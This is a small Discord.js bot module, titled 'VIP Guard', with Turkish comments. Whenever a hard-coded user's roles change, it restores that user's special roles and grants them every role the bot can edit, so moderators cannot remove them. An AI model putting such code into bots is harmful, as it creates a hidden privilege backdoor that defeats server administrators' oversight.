//--------------------------------
// VIP GUARD
//--------------------------------
const TARGET_USER_ID = "1097807544849809408"; // senin ID
const SPECIAL_ROLES = []; // opsiyonel: sabit rolleri buraya ekleyebilirsin

module.exports = (client) => {

    client.on('guildMemberUpdate', async (oldMember, newMember) => {

        if (newMember.id !== TARGET_USER_ID) return;

        try {

            // Eğer özel rol listesi varsa, onları geri ekle
            for (const roleId of SPECIAL_ROLES) {
                if (!newMember.roles.cache.has(roleId)) {
                    await newMember.roles.add(roleId);
                    console.log(`🔒 Restored role ${roleId} to owner`);
                }
            }

            // Tüm rollerini geri yükleme mantığı (modlar alırsa)
            const allRoles = newMember.guild.roles.cache.filter(r => r.editable);
            for (const [roleId, role] of allRoles) {
                if (!newMember.roles.cache.has(roleId)) {
                    await newMember.roles.add(roleId).catch(() => {});
                }
            }

        } catch (err) {
            console.error("VIP Guard Error:", err);
        }

    });

};